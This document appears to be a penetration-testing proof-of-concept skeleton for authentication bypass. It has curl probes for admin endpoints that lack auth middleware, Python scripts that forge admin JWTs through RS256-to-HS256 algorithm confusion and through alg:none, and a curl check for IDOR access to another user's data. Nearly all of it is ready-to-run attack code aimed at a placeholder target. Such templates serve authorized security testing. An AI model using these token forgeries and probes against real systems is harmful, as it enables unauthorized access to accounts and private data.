# PoC Skeleton -- Auth Bypass

## Missing Auth Middleware

```bash
# Step 1: Find unprotected endpoint
curl -X GET http://target/api/admin/users
# Expected: 200 OK with user data (should be 401/403)

# Step 2: Compare with protected endpoint
curl -X GET http://target/api/admin/settings
# Expected: 401 Unauthorized (auth works here)
```

## JWT Algorithm Confusion (RS256 to HS256)

```python
#!/usr/bin/env python3
"""JWT Algorithm Confusion Attack"""
import jwt

# Step 1: Get the public key (often exposed at /jwks or /.well-known/jwks.json)
public_key = open('public.pem').read()

# Step 2: Sign token using public key as HMAC secret
forged = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    public_key,
    algorithm='HS256'
)
print(f'[+] Forged token: {forged}')
# Use this token in Authorization: Bearer header
```

## JWT alg:none

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b'=')
token = header.decode() + '.' + payload.decode() + '.'
print(f'[+] alg:none token: {token}')
```

## IDOR

```bash
# Step 1: Create two accounts (user A and user B)
# Step 2: As user A, access user B resources
curl -H "Authorization: Bearer TOKEN_A" http://target/api/users/USER_B_ID
# If returns user B data: IDOR confirmed
```
